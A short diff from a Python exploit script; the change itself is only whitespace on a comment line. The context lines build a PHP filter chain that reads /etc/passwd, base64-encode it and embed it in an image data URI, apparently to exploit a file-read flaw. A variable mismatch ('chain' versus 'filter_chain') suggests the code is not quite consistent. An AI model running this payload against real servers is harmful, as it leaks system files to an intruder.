@@ -62,7 +62,7 @@ def req(s):
     file_to_leak = '/etc/passwd'
     chain = f"php://filter/{s}/resource={file_to_leak}"
     
-	# Base64 encode the filter embedded inside an <img> tag 
+    # Base64 encode the filter embedded inside an <img> tag 
     import base64
     chain_b64 = base64.b64encode(filter_chain.encode("ascii")).decode("ascii")
     html = f"<img src='data:image/png;base64,{chain_b64}'/>"  
